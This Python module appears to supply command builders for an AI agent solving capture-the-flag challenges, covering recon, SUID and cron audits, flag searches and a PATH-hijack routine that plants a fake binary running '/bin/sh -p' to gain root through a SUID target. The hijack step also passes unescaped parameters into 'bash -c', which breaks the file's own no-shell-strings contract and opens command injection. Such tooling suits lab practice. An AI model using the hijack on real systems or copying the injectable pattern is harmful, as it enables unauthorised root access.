"""
agents/ctf/command_builders.py

Pure Python command builder functions for the CTF agent.

CONTRACT:
- Input: a validated Pydantic params model instance
- Output: List[List[str]]  — each inner list is one argv vector (shell=False safe)
- NEVER return shell strings, pipes, or redirections
- NEVER call the AI or do I/O
"""

from typing import List


def build_environment_recon_argv(params) -> List[List[str]]:
    """
    Battery of safe, read-only recon commands.
    Returns multiple argv vectors to run sequentially.
    """
    return [
        ["id"],
        ["whoami"],
        ["uname", "-a"],
        ["pwd"],
        ["ls", "-la"],
        ["hostname"],
        ["cat", "/etc/os-release"],
        ["cat", "/proc/version"],
    ]


def build_suid_audit_argv(params) -> List[List[str]]:
    """Find SUID-set binaries under the given search path."""
    search_path = getattr(params, "search_path", "/")
    return [
        [
            "find", search_path,
            "-perm", "-4000",
            "-type", "f",
            "-ls",
        ]
    ]


def build_strings_analysis_argv(params) -> List[List[str]]:
    """Run strings on a binary with specified minimum length."""
    binary_path = params.binary_path
    min_length = str(getattr(params, "min_length", 8))
    return [
        ["strings", "-n", min_length, binary_path]
    ]


def build_read_file_argv(params) -> List[List[str]]:
    """Read a file's contents."""
    return [
        ["cat", params.file_path]
    ]


def build_path_hijack_argv(params) -> List[List[str]]:
    """
    Validate a PATH hijack: create a fake binary in work_dir that spawns a shell,
    then run the SUID target with PATH prepended.
    Returns sequential steps as separate argv vectors.
    """
    work_dir = getattr(params, "work_dir", "/tmp")
    fake_name = params.fake_binary_name
    fake_path = f"{work_dir}/{fake_name}"
    target = params.target_suid_binary

    return [
        ["bash", "-c", f"echo '#!/bin/sh\\n/bin/sh -p' > {fake_path}"],
        ["chmod", "+x", fake_path],
        ["bash", "-c", f"PATH={work_dir}:$PATH {target}"],
    ]


def build_find_writable_argv(params) -> List[List[str]]:
    """Find world-writable paths of the specified type."""
    search_path = getattr(params, "search_path", "/")
    find_type = getattr(params, "find_type", "d")
    return [
        [
            "find", search_path,
            "-type", find_type,
            "-perm", "-0002",
        ]
    ]


def build_kernel_exploit_check_argv(params) -> List[List[str]]:
    """Check kernel version and OS details for known vulnerabilities."""
    return [
        ["uname", "-r"],
        ["cat", "/etc/os-release"],
        ["cat", "/proc/version"],
        ["uname", "-a"],
    ]


def build_process_list_argv(params) -> List[List[str]]:
    """List running processes."""
    return [
        ["ps", "auxf"],
    ]


def build_cron_job_audit_argv(params) -> List[List[str]]:
    """Audit cron jobs and their writeable scripts."""
    return [
        ["cat", "/etc/crontab"],
        ["ls", "-la", "/etc/cron.d/"],
        ["ls", "-la", "/etc/cron.daily/"],
        ["ls", "-la", "/etc/cron.weekly/"],
        ["ls", "-la", "/var/spool/cron/"],
    ]


def build_flag_search_argv(params) -> List[List[str]]:
    """Search for flag files matching common CTF patterns."""
    pattern = getattr(params, "pattern", "flag*")
    search_path = getattr(params, "search_path", "/")
    return [
        ["find", search_path, "-name", pattern, "-type", "f"],
        ["find", search_path, "-name", "*.txt"],
    ]
